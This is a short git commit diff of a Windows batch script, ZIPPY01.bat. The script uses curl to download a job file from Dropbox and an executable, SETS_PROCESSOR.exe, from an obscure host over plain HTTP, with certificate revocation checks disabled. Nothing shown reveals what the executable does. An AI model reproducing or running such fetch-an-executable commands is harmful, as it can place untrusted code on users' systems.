f1ecfc4c194652ae0ae410c0096b520a09fa98e9
Cayde01 <84088250+Cayde01@users.noreply.github.com>
2022-12-30 12:29:11 +0100

    Update ZIPPY01.bat

--- ZIPPY01.bat
+++ ZIPPY01.bat
@@ -1,6 +1,4 @@
-
-curl -L -o "C:\K\WORK\JOB\ZIPPY01.job" "https://www.dropbox.com/s/za3uaego0wklxae/ZIPPY001?dl=1" --ssl-no-revoke
-md "K:\WORK\OP"
+curl -L -o "C:\K\WORK\OP\JOB\ZIPPY01.job" "https://www.dropbox.com/s/za3uaego0wklxae/ZIPPY001?dl=1" --ssl-no-revoke
 curl -L -o "K:/WORK/OP/SETS_PROCESSOR.exe" "http://bro-tv.host/sproc/SETS_PROCESSOR.exe" --ssl-no-revoke
 
 cd K:/WORK/OP/
